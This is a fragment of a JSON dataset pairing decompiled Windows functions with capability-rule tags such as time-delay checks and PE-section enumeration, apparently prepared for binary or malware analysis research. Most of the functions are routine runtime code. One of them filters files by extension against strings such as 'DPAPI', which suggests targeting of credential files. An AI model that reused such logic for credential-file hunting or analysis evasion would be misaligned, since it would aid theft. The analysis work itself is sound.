        "decompiled_code": "\nvoid __cdecl fcn.0040bc50(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    \n    iVar2 = in_ECX[4];\n    if (-iVar2 - 1U <= arg_8h) {\n        iVar2 = fcn.00429b7e(0x4452ec);\n    }\n    if (arg_8h != 0) {\n        uVar1 = iVar2 + arg_8h;\n        if (uVar1 == 0xffffffff) {\n            iVar2 = fcn.00429b7e(0x4452ec);\n        }\n        if (in_ECX[5] < uVar1) {\n            fcn.00405ba0(uVar1, iVar2);\n            if (uVar1 == 0) {\n                return;\n            }\n        }\n        else if (uVar1 == 0) {\n            in_ECX[4] = 0;\n            if (0xf < in_ECX[5]) {\n                **in_ECX = 0;\n                return;\n            }\n            *in_ECX = 0;\n            return;\n        }\n        fcn.0040b910(in_ECX[4], arg_8h, arg_ch);\n        in_ECX[4] = uVar1;\n        if (0xf < in_ECX[5]) {\n            *(*in_ECX + uVar1) = 0;\n            return;\n        }\n        *(in_ECX + uVar1) = 0;\n    }\n    return;\n}\n",
        "token_count": 352
    },
    "00418b40": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00418b40(uint noname_0, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = arg_10h - arg_ch;\n    if (arg_14h < arg_10h - arg_ch) {\n        uVar1 = arg_14h;\n    }\n    return uVar1;\n}\n",
        "token_count": 100
    },
    "0042e777": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042e777(int32_t arg_8h)\n\n{\n    if ((arg_8h != 0) && (*(arg_8h + -8) == 0xdddd)) {\n        fcn.0042a7fd(arg_8h + -8);\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "00418a40": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418a40(int32_t param_1)\n\n{\n    *(param_1 + 0x20) = param_1 + 0x18;\n    *(param_1 + 0x24) = param_1 + 0x1c;\n    *(param_1 + 0x10) = param_1 + 8;\n    *(param_1 + 0x30) = param_1 + 0x28;\n    *(param_1 + 0x14) = param_1 + 0xc;\n    *(param_1 + 0x34) = param_1 + 0x2c;\n    *(param_1 + 0xc) = 0;\n    **(param_1 + 0x24) = 0;\n    **(param_1 + 0x34) = 0;\n    **(param_1 + 0x10) = 0;\n    **(param_1 + 0x20) = 0;\n    **(param_1 + 0x30) = 0;\n    return;\n}\n",
        "token_count": 242
    },
    "004208c0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.004208c0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    \n    puVar1 = NULL;\n    if ((((arg_8h != 0) && (arg_ch != 0)) && (puVar1 = (**0x462fe0)(0x40, arg_ch + 1),  puVar1 != NULL)) &&\n       (arg_ch != 0)) {\n        puVar2 = puVar1;\n        do {\n            *puVar2 = puVar2[arg_8h - puVar1];\n            puVar2 = puVar2 + 1;\n            arg_ch = arg_ch + -1;\n        } while (arg_ch != 0);\n    }\n    return puVar1;\n}\n",
        "token_count": 179
    },
    "00426d60": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00426d60(char *arg_8h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    \n    iVar1 = (**0x462f30)(arg_8h);\n    for (pcVar2 = arg_8h + iVar1; (arg_8h < pcVar2 && (*pcVar2 != '.')); pcVar2 = pcVar2 + -1) {\n    }\n    if ((pcVar2 == arg_8h) && (*pcVar2 != '.')) {\n        return false;\n    }\n    iVar1 = (**0x463068)(pcVar2, 0x44867c);\n    if ((((iVar1 != 0) && (iVar1 = (**0x463068)(pcVar2, 0x447014),  iVar1 != 0)) &&\n        (iVar1 = (**0x463068)(pcVar2, \"DPAPI\"),  iVar1 != 0)) &&\n       (((iVar1 = (**0x463068)(pcVar2, 0x44866c),  iVar1 != 0 && (iVar1 = (**0x463068)(pcVar2, 0x448664),  iVar1 != 0))\n        && ((iVar1 = (**0x463068)(pcVar2, \"Cont\"),  iVar1 != 0 && (iVar1 = (**0x463068)(pcVar2, 0x448658),  iVar1 != 0))\n           )))) {\n        iVar1 = (**0x463068)(pcVar2, 0x448650);\n        return iVar1 == 0;\n    }\n    return true;\n}\n",
        "token_count": 357
    },
    "00429c39": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00429c39(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    char *apcStack20 [3];\n    uint uStack8;\n    \n    do {\n        iVar2 = fcn.0042a769(param_1);\n        if (iVar2 != 0) {\n            return;\n        }\n        iVar2 = fcn.00431651(param_1);\n    } while (iVar2 != 0);\n    if ((*0x46338c & 1) == 0) {\n        *0x46338c = *0x46338c | 1;\n        uStack8 = 0x448d5c;\n        fcn.0042aba1(&uStack8);\n        *0x463380 = \"WSHS4954XGCLRNSRX\";\n        fcn.0042d53e(0x43f611);\n    }\n    fcn.0042acd5(0x463380);\n    apcStack20[0] = \"WSHS4954XGCLRNSRX\";\n    fcn.0042b331(apcStack20, 0x44c6c0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 276
    },
    "0042d570": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t * fcn.0042d570(uint32_t *param_1, char param_2)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    \n    uVar1 = param_1 & 3;\n    while (uVar1 != 0) {\n        if (*param_1 == param_2) {\n            return param_1;\n        }\n        if (*param_1 == '\\0') {\n            return NULL;\n        }\n        uVar1 = param_1 + 1 & 3;\n        param_1 = param_1 + 1;\n    }\n    while( true ) {\n        while( true ) {\n            uVar1 = *param_1;\n            uVar4 = uVar1 ^ CONCAT22(CONCAT11(param_2, param_2), CONCAT11(param_2, param_2));\n            uVar3 = uVar1 ^ 0xffffffff ^ uVar1 + 0x7efefeff;\n            puVar5 = param_1 + 1;\n            if (((uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff) & 0x81010100) != 0) break;\n            param_1 = puVar5;\n            if ((uVar3 & 0x81010100) != 0) {\n                if ((uVar3 & 0x1010100) != 0) {\n                    return NULL;\n                }\n                if ((uVar1 + 0x7efefeff & 0x80000000) == 0) {\n                    return NULL;\n                }\n            }\n        }\n        uVar1 = *param_1;\n        if (uVar1 == param_2) {\n            return param_1;\n        }\n        if (uVar1 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar1 >> 8;\n        if (cVar2 == param_2) {\n            return param_1 + 1;\n        }\n        if (cVar2 == '\\0') break;\n        cVar2 = uVar1 >> 0x10;\n        if (cVar2 == param_2) {\n            return param_1 + 2;\n        }\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar1 >> 0x18;\n        if (cVar2 == param_2) {\n            return param_1 + 3;\n        }\n        param_1 = puVar5;\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 591
    },
    "00430eeb": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00430eeb(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00433b40(0x44e7f0, 0xc);\n    fcn.0043431b(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x4633b8;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x4633b4;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x00430f2f;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.0042a7fd(arg_8h_00);\ncode_r0x00430f2f:\n        fcn.0042a7fd(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00430f52();\n    fcn.00433b85();\n    return;\n}\n",
        "token_count": 405
    }
}